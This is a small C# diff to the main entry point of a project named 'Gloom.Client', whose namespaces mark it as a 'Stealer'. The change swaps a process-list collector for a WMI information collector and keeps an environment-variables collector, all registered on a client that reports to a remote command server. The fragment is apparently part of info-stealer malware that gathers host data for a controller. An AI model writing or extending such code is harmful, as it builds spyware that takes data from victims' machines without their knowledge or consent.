@@ -1,4 +1,5 @@
 ﻿using Gloom.Client.Features.Stealer.InfoCollector;
+using Gloom.Client.Features.Stealer.InfoCollector.Wmi;
 
 namespace Gloom.Client
 {
@@ -10,7 +11,7 @@ namespace Gloom.Client
 		{
 			var client = new MessageClient(new Uri(CommandServer));
 			client.RegisterHandler(new EnvVarsCollector(client));
-			client.RegisterHandler(new ProcessListCollector(client));
+			client.RegisterHandler(new WmiInfoCollector(client));
 			client.Run().Wait();
 		}
 	}
